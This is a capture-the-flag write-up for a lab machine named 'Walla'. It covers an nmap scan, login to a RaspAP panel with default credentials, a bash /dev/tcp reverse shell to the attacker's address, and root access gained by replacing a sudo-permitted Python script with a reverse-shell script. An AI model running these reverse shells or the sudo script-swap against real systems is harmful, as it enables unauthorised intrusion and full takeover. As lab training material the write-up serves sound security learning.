# CTF Writeup: Walla

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.153.97 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-24 05:27 EST
Nmap scan report for 192.168.153.97
Host is up (0.028s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Not valid before: 2020-09-17T18:26:36
|_Not valid after:  2030-09-15T18:26:36
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
8091/tcp  open  http       lighttpd 1.4.53
|_http-server-header: lighttpd/1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   27.71 ms 192.168.45.1
2   27.74 ms 192.168.45.254
3   27.80 ms 192.168.251.1
4   27.87 ms 192.168.153.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.10 seconds
```

There seems to be an webservice running on port 8091. Let's observe it.

The Web Application immediatly prompted us with authentication, after further analyis of the port scan, we found an application called "RaspAP".

Googled for default credentials for this application and found:

```
admin:secret
```

## Initial Access

We authenticated successfully and landed in the application panel. Let's enumerate it.

Navigating onto System > Console, I have an web shell.

Let's get RCE.

First I will startup an listener on port 80.

```
nc -lvnp 80
```

I utilized the following bash command:

```
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.202/80 0>&1'
```

Gained RCE as user "www-data".

```
nc -lvnp 80   
listening on [any] 80 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.153.97] 58506
bash: cannot set terminal process group (652): Inappropriate ioctl for device
bash: no job control in this shell
www-data@walla:/var/www/html/includes$
```

## Privilege Escalation

Performed shell hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Enumerated users on the target system.

```
www-data@walla:/var/www/html/includes$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
terry:x:1002:1002::/home/terry:/bin/bash
walter:x:1003:1003::/home/walter:/bin/bash
janis:x:1004:1004::/home/janis:/bin/bash
```

Retrieved local.txt in /home/walter directory.

```
926662b244a1d53c2dd6e3762eacc546
```

In the same directory there is also an interesting "wifi_reset.py" script.

Let's try & observe it.

We discovered that sudo -l allows us to run the wifi_reset.py script with sudo (root) rights.

```
www-data@walla:/home/walter$ sudo -l
Matching Defaults entries for www-data on walla:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
```

What's also interesting is that we have full write access to /home/walter directory. Which means we can move the current script out of the directory & just create our own malicious file.

```
mv wifi_reset.py wifi_backup.py
```

Created my own wifi_reset.py script with the following content.

```
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.45.202", 8091))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

import pty
pty.spawn("/bin/bash")
```

Gave the script executable rights.

```
chmod +x wifi_reset.py
```

Started up my listener on port 8091.

```
nc -lvnp 8091
```

Executed the script with sudo rights.

```
www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py
```

Gained RCE as user "root".

```
nc -lvnp 8091 
listening on [any] 8091 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.153.97] 45334
root@walla:/home/walter#
```

Retrieved proof.txt in /root directory.

```
ded26b3828af76248e86c3ac0300be0d
```
